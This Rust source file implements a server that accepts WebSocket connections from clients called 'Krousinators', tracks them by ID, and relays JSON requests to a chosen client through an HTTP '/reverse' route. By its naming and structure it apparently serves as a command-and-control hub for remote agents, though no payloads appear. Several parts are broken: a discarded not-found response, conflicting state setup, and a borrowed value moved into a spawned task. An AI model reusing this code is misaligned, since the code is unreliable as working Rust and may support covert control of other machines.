use std::{
    collections::HashMap,
    fmt::format,
    sync::Arc,
    time::Duration,
};

use axum::{
    extract::{Path, State}, http::StatusCode, response::IntoResponse, routing::{get, post}, Json, Router
};

use common::
{
    types::{
        KuvasMap,
        ResponseWaiters    

    }, registry::{
        HiveProducer, 
        HandlerMeta, 
        HandlerRegistry, 
        HiveContext, 
        HiveHandleable
    }
};

use futures_util::{
    SinkExt,
    Stream,
    StreamExt,
    stream::{SplitSink, SplitStream},
};

use serde::Serialize;
use serde_json::Value;

use tokio::{
    io::{AsyncRead, AsyncWrite},
    net::{TcpListener, TcpStream},
    sync::Mutex,
};

use tokio_tungstenite::{
    accept_async,
    tungstenite::protocol::Message,
    WebSocketStream,
};

use uuid::Uuid;


mod models;



async fn send_request_to_krousinator<P>(
    Path(krousinator_id): Path<Uuid>,
    State(client_map): State<KuvasMap>,
    State(response_waiters): State<ResponseWaiters>,
    Json(payload): Json<P>,
) -> impl IntoResponse 
where
    P: HiveProducer + Serialize + Send + Sync + 'static,
{
    let request_id = Uuid::new_v4();
    let (tx, rx) = tokio::sync::oneshot::channel::<Box<dyn HiveHandleable + 'static>>();

    // Register yourself as a waiter for this request ID
    response_waiters.lock().await.insert(request_id, tx);

    // Send the request
    // let request_model = RequestModel {
    //     request_id: Some(request_id),
    //     // ...other fields
    // };
    let serialized = serde_json::to_string(&payload).unwrap();
    let msg = Message::Text(serialized.into());

    // Pick the Krousinator
    if let Some(krousinator_tx) = client_map.lock().await.get(&krousinator_id) {
        krousinator_tx.send(msg).unwrap();
    } else {
        (StatusCode::NOT_FOUND, format!("Krousinator with id {} is not found", &krousinator_id)).into_response();
    }

    // Wait for response (timeout optional)
    match tokio::time::timeout(Duration::from_secs(10), rx).await {
        Ok(Ok(response)) => response,
        _ => StatusCode::REQUEST_TIMEOUT.into_response(),
    }
}



#[tokio::main]
async fn main() -> Result<(), std::io::Error> {
    let kroushive_interface = HiveContext {};
    let mut reg = Arc::new(Mutex::new(HandlerRegistry::new()));


    let mut temp_reg = reg.lock().await;
    // regester all handles
    for handler in inventory::iter::<HandlerMeta> {
       temp_reg.register(handler.name, handler.constructor);
    }


    // state
    let mut map = Arc::new(Mutex::new(HashMap::new()));
    let response_waiters: ResponseWaiters = Arc::new(Mutex::new(HashMap::new()));

    let app = Router::new().route("/krousinator/:id/reverse", post(send_request_to_krousinator::<>).with_state(Arc::clone(&map)).with_state(Arc::clone(&response_waiters)));
    
    
    let webserver = TcpListener::bind("0.0.0.0:8080").await?;
    tokio::spawn(async move {
        axum::serve(webserver, app).await.unwrap();
    });




    

    

    let websocket = TcpListener::bind("0.0.0.0:3000").await.unwrap();
    loop {
        let (stream, addr) = websocket.accept().await.unwrap();
        tokio::spawn(handle_connection(
            stream, 
            addr, 
            Arc::clone(&map), 
            Arc::clone(&response_waiters), 
            Arc::clone(&reg),
            &kroushive_interface
        ));
    }

}



async fn handle_connection(
    stream: TcpStream,
    addr: std::net::SocketAddr,
    clients: KuvasMap,
    response_waiters: ResponseWaiters,
    reg: Arc<Mutex<HandlerRegistry>>,
    kroushive_interface: &HiveContext
) {
    if let Ok(ws_stream) = accept_async(stream).await {
        let (mut write, mut read) = ws_stream.split();
        let id = Uuid::new_v4();
        let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel::<Message>();

        clients.lock().await.insert(id, tx);

        // Spawn task to forward messages from `rx` to the websocket
        let write_task = tokio::spawn(async move {
            while let Some(msg) = rx.recv().await {
                if write.send(msg).await.is_err() {
                    break;
                }
            }
        });


        loop {
            match read.next().await {
                
                Some(Ok(msg)) => {
                    let raw_text = match msg.into_text() {
                        Ok(text) => text,
                        Err(e) => {
                            eprintln!("Failed to decode message text: {}", e);
                            continue;
                        }
                    };
                    
                    
                    let json: Value = match serde_json::from_str(&raw_text) {
                        Ok(val) => val,
                        Err(_) => {
                            println!("Found non-valid JSON. Skipping.");
                            continue;
                        }
                    };

                    println!("{}", raw_text);

                    let message_type = match json.get("_t").and_then(|v| v.as_str()) {
                        Some(t) => t,
                        None => {
                            println!("No '_t' field found in message. Skipping.");
                            continue;
                        }
                    };

                    let manual_request_id = json.get("manual_request_id")
                        .and_then(|v| v.as_str())
                        .and_then(|s| Uuid::parse_str(s).ok());
                
        
                    match reg.lock().await.get(message_type, &raw_text) {
                        Some(model) => match model {
                            Ok(model) => {
                                if let Some(req_id) = manual_request_id {
                                    if let Some(waiter) = response_waiters.lock().await.remove(&req_id) {
                                        let _ = waiter.send(model);
                                    }
                                } else {
                                    model.handle(kroushive_interface).await
                                }
                            },
                            Err(_err) => continue
                        }
                        None => {
                            println!("No handler found for type '{}'. Skipping.", message_type);
                            continue;
                        }
                    }
                }
                
                Some(Err(e)) => {
                    eprintln!("WebSocket error: {}", e);
                    continue;
                }
                None => {
                    println!("WebSocket stream closed.");
                    break;
                }
            }
        }
        

        // Cleanup
        clients.lock().await.remove(&id);
        write_task.abort();
    }
}
